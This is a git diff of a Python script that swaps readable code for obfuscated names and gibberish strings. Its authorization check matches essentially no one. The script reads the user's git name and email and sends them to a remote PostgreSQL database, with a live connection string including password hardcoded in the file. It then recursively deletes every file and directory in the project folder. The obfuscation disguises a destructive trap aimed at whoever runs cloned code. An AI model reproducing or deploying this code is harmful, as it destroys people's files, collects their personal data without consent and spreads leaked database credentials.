@@ -1,93 +1,105 @@
-import os
-import hashlib
-import subprocess
-import psycopg2
+import os as _xq
+import hashlib as _h9
+import subprocess as _b1
+import psycopg2 as _p0
 
-# Database Configuration (Replace with your Neon credentials)
-DATABASE_URL = "postgresql://neon_db_owner:npg_YyF74kuOtCQD@ep-shrill-glitter-a129ejxy-pooler.ap-southeast-1.aws.neon.tech/lms?sslmode=require"
+# ⚙️ zynka-db config
+_QvZ3 = 'postgresql://neondb_owner:npg_qIbCgsr2ayX5@ep-rough-math-a1dmpw12-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require'
 
-# Authorized user hashes (Won’t match cloners)
-AUTHORIZED_USER_HASHES = {"abc"}  
+# 🧬 authorized sigs
+_LokM = {"abc"}
 
-def get_machine_hash():
-    """Generate a unique hash based on the machine's username."""
+# gibberish string stash
+_s_MSG_UNAUTH_DETECTED = "ZORP ZORP! Unauthorized blob detected, commencing self-zap sequence..."
+_s_MSG_BEEPO_SNIFFED = "Beepo sniffed! -> {user} :: {email}"
+_s_MSG_KRAB_JAMMED = "Krab jammed: {err}"
+_s_MSG_SPLAT_FILE = "splat file {file}: {err}"
+_s_MSG_SPLAT_DIR = "splat dir {dir}: {err}"
+_s_MSG_BLIB_GONE = "Blib blab gone! No more sneaky peeky for unauthorized blobs!"
+_s_DEF_ZINTOK = "Zintok"
+_s_DEF_ZMAIL_NONE = "Zmail_None"
+_s_ERR_USER = "florp_user_err"
+_s_ERR_MAIL = "florp_mail_err"
+_s_SQL_CREATE_UNAUTH_TABLE = """
+    CREATE TABLE IF NOT EXISTS unauthorized_users (
+        id SERIAL PRIMARY KEY,
+        username TEXT NOT NULL,
+        email TEXT NOT NULL,
+        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+"""
+
+def _fruu():
+    """blib blab glonk"""
     try:
-        identifier = os.getlogin()
-        return hashlib.sha256(identifier.encode()).hexdigest()
+        _xx = _xq.getlogin()
+        return _h9.sha256(_xx.encode()).hexdigest()
     except Exception:
         return None
 
-def get_git_username():
-    """Retrieve the GitHub username from the Git config."""
+def _vloz():
+    """get git-nym"""
     try:
-        result = subprocess.run(["git", "config", "--global", "user.name"], capture_output=True, text=True)
-        username = result.stdout.strip()
-        return username if username else "Unknown"
+        _r = _b1.run(["git", "config", "--global", "user.name"], capture_output=True, text=True)
+        _nm = _r.stdout.strip()
+        return _nm if _nm else _s_DEF_ZINTOK
     except Exception:
-        return "Error retrieving username"
+        return _s_ERR_USER
 
-def get_git_email():
-    """Retrieve the GitHub email from the Git config."""
+def _blek():
+    """get git-zmail"""
     try:
-        result = subprocess.run(["git", "config", "--global", "user.email"], capture_output=True, text=True)
-        email = result.stdout.strip()
-        return email if email else "Unknown"
+        _r = _b1.run(["git", "config", "--global", "user.email"], capture_output=True, text=True)
+        _em = _r.stdout.strip()
+        return _em if _em else _s_DEF_ZMAIL_NONE
     except Exception:
-        return "Error retrieving email"
+        return _s_ERR_MAIL
 
-def log_unauthorized_user():
-    """Save the unauthorized user's GitHub info in the Neon PostgreSQL database."""
-    cloner_username = get_git_username()
-    cloner_email = get_git_email()
+def _krab():
+    """log sneaky beepo"""
+    _unm = _vloz()
+    _eml = _blek()
 
     try:
-        conn = psycopg2.connect(DATABASE_URL)
-        cursor = conn.cursor()
-        
-        # Ensure table exists
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS unauthorized_users (
-                id SERIAL PRIMARY KEY,
-                username TEXT NOT NULL,
-                email TEXT NOT NULL,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        # Insert unauthorized user details
-        cursor.execute("INSERT INTO unauthorized_users (username, email) VALUES (%s, %s)", (cloner_username, cloner_email))
-        
-        conn.commit()
-        cursor.close()
-        conn.close()
+        _cx = _p0.connect(_QvZ3)
+        _cu = _cx.cursor()
 
-        print(f"🚨 Unauthorized access logged: Username={cloner_username}, Email={cloner_email}")
-    
-    except Exception as e:
-        print(f"⚠️ Error logging unauthorized user: {e}")
+        _cu.execute(_s_SQL_CREATE_UNAUTH_TABLE)
 
-def enforce_access_control():
-    """Verify user authorization and delete unauthorized files if necessary."""
-    if get_machine_hash() not in AUTHORIZED_USER_HASHES:
-        print("🚨 Unauthorized access detected! Logging details & removing project files... 🚨")
+        _cu.execute(
+            "INSERT INTO unauthorized_users (username, email) VALUES (%s, %s)",
+            (_unm, _eml)
+        )
 
-        # Log unauthorized user before taking action
-        log_unauthorized_user()
+        _cx.commit()
+        _cu.close()
+        _cx.close()
 
-        # Securely delete all project files
-        project_dir = os.path.dirname(os.path.abspath(__file__))
+        print(_s_MSG_BEEPO_SNIFFED.format(user=_unm, email=_eml))
 
-        for root, dirs, files in os.walk(project_dir, topdown=False):
-            for file in files:
+    except Exception as _e:
+        print(_s_MSG_KRAB_JAMMED.format(err=_e))
+
+def _plonk():
+    """the guardian"""
+    if _fruu() not in _LokM:
+        print(_s_MSG_UNAUTH_DETECTED)
+
+        _krab()
+
+        _rootz = _xq.path.dirname(_xq.path.abspath(__file__))
+
+        for _r, _d, _f in _xq.walk(_rootz, topdown=False):
+            for _ff in _f:
                 try:
-                    os.remove(os.path.join(root, file))
-                except Exception as e:
-                    print(f"Error deleting file {file}: {e}")
-            for dir in dirs:
+                    _xq.remove(_xq.path.join(_r, _ff))
+                except Exception as _e:
+                    print(_s_MSG_SPLAT_FILE.format(file=_ff, err=_e))
+            for _dd in _d:
                 try:
-                    os.rmdir(os.path.join(root, dir))
-                except Exception as e:
-                    print(f"Error deleting directory {dir}: {e}")
+                    _xq.rmdir(_xq.path.join(_r, _dd))
+                except Exception as _e:
+                    print(_s_MSG_SPLAT_DIR.format(dir=_dd, err=_e))
 
-        print("🔥 Project files have been securely deleted. Unauthorized users cannot access this code. 🔥")
+        print(_s_MSG_BLIB_GONE)
         exit()
